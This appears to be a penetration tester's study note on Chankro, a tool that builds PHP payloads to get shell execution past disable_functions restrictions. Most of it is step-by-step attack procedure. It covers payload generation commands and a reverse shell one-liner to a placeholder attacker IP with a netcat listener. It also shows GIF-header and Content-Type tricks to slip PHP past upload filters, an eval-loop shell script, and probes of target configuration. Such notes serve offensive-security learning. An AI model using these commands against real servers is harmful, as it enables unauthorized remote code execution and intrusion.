#tools #php #rce #bypass

**Chankro** generates PHP/binary polyglots that execute shell code despite `disable_functions` restrictions. It works by embedding a compiled C shell inside a PHP file and extracting it at runtime using functions that aren't typically disabled (like `pcntl_fork()`).

---

## When to Use

**Use Chankro when:**
- Target has `disable_functions = shell_exec, system, exec, passthru, ...` (or similar)
- You can upload a file to the web root
- `pcntl_*` functions are NOT disabled
- You need command execution but basic web shells fail

**Don't use if:**
- Both `disable_functions` and `disable_classes` are locked down
- No write permissions to `/tmp` or upload directory
- File upload is completely blocked
- Just a basic web shell works fine (Chankro is overkill for simple cases)

---

## Installation

```bash
git clone https://github.com/synacktiv/chankro
cd chankro
# No dependencies; pure Python3
```

---

## Basic Usage

### Generate Payload

```bash
python3 chankro.py --arch 64 --input shell.sh --output payload.php --path /var/www/html/uploads
```

**Parameters:**
- `--arch` — `32` or `64` (target CPU architecture)
- `--input` — shell script to execute (can be a one-liner or full script)
- `--output` — output PHP file name
- `--path` — where the binary will be extracted at runtime (must be writable; usually `/tmp` or the upload dir itself)

### Example: Simple Test

```bash
# Create a simple test payload
echo "whoami > /tmp/output.txt" > test.sh

# Generate Chankro payload
python3 chankro.py --arch 64 --input test.sh --output boss.php --path /tmp

# Upload boss.php to the target
# Access it: curl http://target/uploads/boss.php

# Check output on target
curl http://target/uploads/boss.php?cmd=cat+/tmp/output.txt
```

### Example: Reverse Shell

```bash
# Create reverse shell script
echo "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" > revshell.sh

# Generate
python3 chankro.py --arch 64 --input revshell.sh --output boss.php --path /tmp

# Start listener
nc -lvnp 4444

# Upload and trigger
curl http://target/uploads/boss.php
```

---

## Bypassing File Upload Filters

Chankro output is a valid PHP file, but many upload filters reject `.php` files or check magic bytes. Use polyglot tricks:

### GIF87a Header (MIME check bypass)

```bash
# Prepend GIF87a header
echo -e 'GIF87a' | cat - boss.php > final.php

# Now it passes MIME type checks (looks like an image) but PHP parser ignores the header
# Upload as "image.php" or change Content-Type to "image/gif" in Burp
```

### How it works:
- File magic bytes: `47 49 46 38 37 61` = `GIF87a`
- MIME validators see GIF header → accept it
- PHP parser sees `GIF87a` text, then `<?php` → executes the PHP
- Binary validator may still catch it, but MIME-based filters (most common) pass

### In Burp Suite

1. Generate payload: `python3 chankro.py ...`
2. Intercept the upload request
3. Change `Content-Type: application/php` → `Content-Type: image/gif`
4. Prepend GIF header to the file content:
   ```
   GIF87a[rest of PHP payload]
   ```
5. Send

---

## Payload Structure

Generated Chankro payloads are roughly:

```php
<?php
// 1. Embedded binary (packed/encoded C shell)
$binary = base64_decode("...[long encoded binary]...");

// 2. Extract to writable location
file_put_contents("/tmp/extracted_shell", $binary);
chmod("/tmp/extracted_shell", 0755);

// 3. Execute using pcntl_fork() or proc_open() (not disabled)
$pid = pcntl_fork();
if ($pid == 0) {
    // Child process
    exec("/tmp/extracted_shell");
}
?>
```

This bypasses `disable_functions` because:
- `file_put_contents()` — usually not disabled (needed for many apps)
- `pcntl_fork()` / `proc_open()` — not in typical `disable_functions` lists
- The extracted binary runs directly (not through a disabled PHP function)

---

## Tips & Tricks

### Test if Chankro will work

```bash
# Check if pcntl functions are available
curl "http://target/test.php?cmd=php+-i+|+grep+pcntl"

# Check disable_functions
curl "http://target/test.php?cmd=php+-i+|+grep+disable_functions"
```

### Multiple command execution

If your shell script does one thing and exits, Chankro won't give you persistent execution. Instead:

```bash
# Create an interactive shell script
cat > interactive.sh << 'EOF'
#!/bin/bash
# Stay alive and accept commands
while true; do
    read cmd
    eval "$cmd"
done
EOF

python3 chankro.py --arch 64 --input interactive.sh --output boss.php --path /tmp
```

Then pipe commands to it:
```bash
(echo "id"; echo "whoami"; sleep 1) | curl http://target/uploads/boss.php
```

### Extract path enumeration

If you don't know what path is writable:
```bash
# Try common paths
--path /tmp
--path /var/www/html/uploads
--path /var/tmp
--path /dev/shm
--path /home/www-data/tmp
```

---

## Troubleshooting

| Issue | Cause | Fix |
|---|---|---|
| "Permission denied" on execute | Extract path not writable | Try different `--path` (usually `/tmp` works) |
| "No such file" after upload | PHP executed but binary not found | Verify extract path is correct and writable |
| Upload rejected (file type) | MIME/extension filter | Prepend GIF87a header; try `.php5`, `.phtml` extensions |
| Still getting "disabled function" error | `pcntl_*` is also disabled | Use different bypass (e.g., [[GTFOBins]] if available, or LD_PRELOAD) |

---

## Related

- [[Web Shells]] — basic RCE payload alternatives
- [[File Upload Vulnerabilities]] — getting your payload to upload
- [[Reverse Shells]] — turning Chankro execution into interactive shell
- [[PHP Modules]] — checking what's available on the target

---

## References

- **Chankro GitHub:** https://github.com/synacktiv/chankro
- **Polyglot file bypass:** https://badboy17.medium.com/bypass-disable-functions-try-hack-me-47fed72da9e9
